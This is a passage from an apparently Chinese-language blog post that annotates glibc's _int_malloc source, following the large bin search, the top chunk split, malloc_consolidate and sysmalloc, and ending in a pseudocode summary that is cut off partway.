class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                  malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">              &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">              malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//为空则设置victim的fd_nextsize和bk_nextsize都为自己</span></span><br><span class="line">      victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>然后将victim链入对应的bin中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>
<p>之后是一些tcache bin的操作，tcache_unsorted_count自增，如果return_cached不为零，并且满足一些条件后，则从tcache中寻找chunk并返还。</p>
<p>如果循环次数足够多了，就退出这个循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">filling the cache, return one of the cached ones.  */</span></span><br><span class="line">  ++tcache_unsorted_count;</span><br><span class="line">  <span class="keyword">if</span> (return_cached</span><br><span class="line">&amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span> <span class="comment">//mp_.tcache_unsorted_limit是被从初始化为0的</span></span><br><span class="line">&amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<h6 id="真正的large-bin搜索阶段"><a href="#真正的large-bin搜索阶段" class="headerlink" title="真正的large bin搜索阶段"></a>真正的large bin搜索阶段</h6><p>如果unsorted bin中也搜不到的话，之后便是在large bin中搜索的过程。这个也位于那个<code>for(;;)</code>的大循环当中。这个和之前那个<code>unsorted bin</code>中的过程有点类似。但是之前那个是将unsorted bin中的chunk取出放进large bin中(如果大小合适的话)，而这里是从large bin中取合适的chunk，可能涉及到chunk的切割操作。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">  bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果bin为空或者bin中的chunk都太小，则跳过</span></span><br><span class="line">  <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">  <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">&amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">  &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      victim = victim-&gt;bk_nextsize;</span><br><span class="line">      <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//找到一个大小合适的chunksize，也就是第一个大于等于nb的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">          list does not have to be rerouted.  */</span></span><br><span class="line">      <span class="comment">//这里判断了选取的victim是否是bin中最后一个(也就是最小的)，并且同一个chunk链的两个chunk大小相同</span></span><br><span class="line">      <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">&amp;&amp; chunksize_nomask (victim)</span><br><span class="line">== chunksize_nomask (victim-&gt;fd))</span><br><span class="line">        victim = victim-&gt;fd;</span><br><span class="line"><span class="comment">//把victim取下，进行切割</span></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      unlink_chunk (av, victim);</span><br><span class="line"><span class="comment">//如果切下来之后剩余块过小，则不进行分割，直接返还给用户(所以会有冗余)</span></span><br><span class="line">      <span class="comment">/* Exhaust */</span></span><br><span class="line">      <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (victim);</span><br><span class="line">        &#125;</span><br><span class="line">  <span class="comment">//否则进行分割，然后放入unsorted bin中</span></span><br><span class="line">      <span class="comment">/* Split */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">              have to perform a complete insert here.  */</span></span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class="line">          <span class="comment">//这些就是把分割后的remainder链入unsorted bin的过程</span></span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">            &#123;</span><br><span class="line">              remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="进一步的large-bin搜索与top-chunk环节"><a href="#进一步的large-bin搜索与top-chunk环节" class="headerlink" title="进一步的large bin搜索与top chunk环节"></a>进一步的large bin搜索与top chunk<strong>环节</strong></h6><p>如果在大小适合的large bin中还没有找到的话，则去下一个更大的链表中去查找然后切割，如果还是没有就去top chunk那去切割</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">++idx;</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line">              <span class="keyword">goto</span> use_top;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">    <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	<span class="comment">//找到了合适的bin，然后取victim</span></span><br><span class="line">    <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">    victim = last (bin);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">    <span class="comment">//victim==bin，意味着这个bin为空</span></span><br><span class="line">    <span class="keyword">if</span> (victim == bin)</span><br><span class="line">      &#123;</span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="comment">//如果不为空，则直接取。由于我们是从更大的large bin中去取得，所以大小不出意外的话是没问题的，这里还是做了一个size&gt;=nb得判断</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">        assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line"><span class="comment">//类似刚刚的large bin操作，是一个取出然后切割的过程</span></span><br><span class="line">        <span class="comment">/* unlink */</span></span><br><span class="line">        unlink_chunk (av, victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exhaust */</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">          &#123;</span><br><span class="line">            set_inuse_bit_at_offset (victim, size);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">  set_non_main_arena (victim);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Split */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                have to perform a complete insert here.  */</span></span><br><span class="line">            bck = unsorted_chunks (av);</span><br><span class="line">            fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class="line">            remainder-&gt;bk = bck;</span><br><span class="line">            remainder-&gt;fd = fwd;</span><br><span class="line">            bck-&gt;fd = remainder;</span><br><span class="line">            fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">              &#123;</span><br><span class="line">                remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                      (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">            set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">            set_foot (remainder, remainder_size);</span><br><span class="line">          &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>如果遍历完了还是没有，则会去top chunk那去取</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span> <span class="comment">//如果搜完了还是没有，就去top chunk</span></span><br><span class="line">	<span class="keyword">goto</span> use_top;</span><br></pre></td></tr></table></figure>
<p>去top chunk取的分析如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">      (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">      search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">      less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">      be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">      limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">      MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">      exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">      reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">      to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">      here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="comment">/* restore original bin index */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里的过程很清楚，首先判断top chunk的大小是否足够，如果足够那么直接切割</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>如果不够的话，并且存有fastchunk，那么就会调用<code>malloc_consolidate</code>进行一个chunk合并的操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">    here for all block sizes.  */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>否则的话，就需要调用sysmalloc进行分配了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p>以上便是<code>_int_malloc</code>的全部流程。概括来说是这样的(感觉我这个写法也是没谁了2333，能理解就行)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">_int_malloc</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足fastbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去fastbin中找</span><br><span class="line">        <span class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行fastbin reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(请求的大小比满足smallbin范围)</span><br><span class="line">    &#123;</span><br><span class="line">        去smallbin中找</span><br><span class="line">        <span class="keyword">if</span>(找到了)</span><br><span class="line">        &#123;</span><br><span class="line">           进行small reverse into tcache </span><br><span class="line">            <span class="keyword">return</span> 指针</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//大小位于large bin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(有fastchunks)</span><br><span class="line">            malloc_consolidate合并堆块</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(unsorted bin非空) <span class="comment">//在unsorted bin中找合适的,遍历unsorted bin中的victim</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(满足一定条件)<span class="comment">//具体条件上面分析过,这里的目的是理解整个流程而非细节</span></span><br><span class="line">                切割</span><br><span class="line">                <span class="keyword">return</span> 指针</span><br><span class="line">            <span class="keyword">if</span>(大小正合适)</span><br><span class="line">                <span class="keyword">return</span> 指针<span class="comment">//或者放tcache中，等下次循环的时候来取</span></span><br><span class="line">            <span class="keyword">if</span>(victim在small bin范围)</span><br><span class="line">                一些操作</span><br><span class="line">           	<span class="keyword">else</span></span><br><span class="line">                一些操作</span><br><span class="line">             把victim链进small bin或者large bin</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(请求大小满足large bin)</span><br><span class="line">        &#123;</span><br><span class="line">            到相应大小的large bin中取</span><br><span class="line">             如果切割完有剩余，放unsorted bin中</span><br><span class="line">        